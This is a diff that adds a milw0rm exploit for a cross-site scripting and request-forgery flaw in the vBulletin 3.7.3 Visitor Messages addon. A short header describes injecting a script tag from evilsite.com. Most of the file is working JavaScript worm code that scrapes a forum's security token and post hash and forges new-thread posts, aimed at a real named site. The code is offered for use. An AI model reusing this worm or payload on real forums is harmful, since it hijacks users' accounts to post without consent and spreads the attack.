@@ -1,0 +1,93 @@
+/* -----------------------------
+ * Author      = Mx
+ * Title       = vBulletin 3.7.3 Visitor Messages XSS/XSRF + worm
+ * Software    = vBulletin
+ * Addon       = Visitor Messages
+ * Version     = 3.7.3
+ * Attack      = XSS/XSRF
+
+ - Description = A critical vulnerability exists in the new vBulletin 3.7.3 software which comes included
+ + with the visitor messages addon (a clone of a social network wall/comment area).
+ - When posting XSS, the data is run through htmlentities(); before being displayed
+ + to the general public/forum members. However, when posting a new message,
+ - a new notification is sent to the commentee. The commenter posts a XSS vector such as
+ + <script src="http://evilsite.com/nbd.js">, and when the commentee visits usercp.php
+ - under the domain, they are hit with an unfiltered xss attach. XSRF is also readily available
+ + and I have included an example worm that makes the user post a new thread with your own
+ - specified subject and message.
+
+ * Enjoy. Greets to Zain, Ytcracker, and http://digitalgangster.com which was the first subject
+ * of the attack method.
+ * ----------------------------- */
+
+function getNewHttpObject() {
+var objType = false;
+try {
+objType = new ActiveXObject('Msxml2.XMLHTTP');
+} catch(e) {
+try {
+objType = new ActiveXObject('Microsoft.XMLHTTP');
+} catch(e) {
+objType = new XMLHttpRequest();
+}
+}
+return objType;
+}
+
+function getAXAH(url){
+
+var theHttpRequest = getNewHttpObject();
+theHttpRequest.onreadystatechange = function() {processAXAH();};
+theHttpRequest.open("GET", url);
+theHttpRequest.send(false);
+
+function processAXAH(){
+if (theHttpRequest.readyState == 4) {
+if (theHttpRequest.status == 200) {
+
+var str = theHttpRequest.responseText;
+var secloc = str.indexOf('var SECURITYTOKEN = "');
+var sectok = str.substring(21+secloc,secloc+51+21);
+
+var posloc = str.indexOf('posthash" value="');
+var postok = str.substring(17+posloc,posloc+32+17);
+
+var subject = 'subject text';
+var message = 'message text';
+
+postAXAH('http://digitalgangster.com/4um/newthread.php?do=postthread&f=5', 'subject=' + subject + '&message=' + message + '&wysiwyg=0&taglist=&iconid=0&s=&securitytoken=' + sectok + '&f=5&do=postthread&posthash=' + postok + 'poststarttime=1&loggedinuser=1&sbutton=Submit+New+Thread&signature=1&parseurl=1&emailupdate=0&polloptions=4');
+
+}
+}
+}
+}
+
+
+
+
+
+
+
+
+function postAXAH(url, params) {
+var theHttpRequest = getNewHttpObject();
+               
+theHttpRequest.onreadystatechange = function() {processAXAHr(elementContainer);};
+theHttpRequest.open("POST", url);
+theHttpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=iso-8859-2');
+theHttpRequest.send(params);
+
+function processAXAHr(elementContainer){
+if (theHttpRequest.readyState == 4) {
+if (theHttpRequest.status == 200) {
+
+}
+}
+}
+}
+
+
+getAXAH('http://digitalgangster.com/4um/newthread.php?do=newthread&f=5');
+document.write('<iframe src="http://digitalgangster.com/4um/newthread.php?do=newthread&f=5">');
+
+# milw0rm.com [2008-11-20]
